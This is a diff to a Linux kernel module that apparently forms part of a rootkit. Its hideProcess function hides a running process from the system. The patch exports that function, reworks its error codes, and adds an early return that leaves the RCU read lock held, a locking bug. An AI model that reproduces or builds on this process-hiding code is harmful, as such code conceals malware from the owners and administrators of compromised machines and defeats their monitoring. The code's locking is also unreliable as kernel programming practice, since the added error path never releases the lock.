@@ -25,7 +25,7 @@ struct restorableHiddenTask { //TODO: rename this
 struct restorableHiddenTask onlyHiddenTask = {NULL};
 
 // Function Prototyps
-static int hideProcess(int pidNumber);
+int hideProcess(int pidNumber);
 static struct restorableHiddenTask hideProcessGivenRcuLockIsHeldAndReturnRestorableHiddenTask(struct pid *pid);
 static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task);
 static int isTaskHidden(void *task);
@@ -85,19 +85,23 @@ void processHider_exit(void) {
 
 //returns error code...
 //PRESENTLY ONLY SUPPORTS HIDING ONE PROCESS
-static int hideProcess(int pidNumber) {
+int hideProcess(int pidNumber) {
 	struct pid *pid = find_get_pid(pidNumber); //todo: check allocation fo this...
 	if (pid == NULL) {
-		return 1;
+		return -1;
 	}
 	
 	rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
 	
 	if (onlyHiddenTask.task != NULL) {
-		printInfo("warning another task was already hidden - this is not supported properly yet\n");
+		printError("warning another task was already hidden - this is not supported properly yet\n");
+		return -1;
 	}
 
 	onlyHiddenTask = hideProcessGivenRcuLockIsHeldAndReturnRestorableHiddenTask(pid);
+	if (onlyHiddenTask.task == NULL) {
+		printError("failed to hide task\n");
+	}
 	
 	rcu_read_unlock();
 	
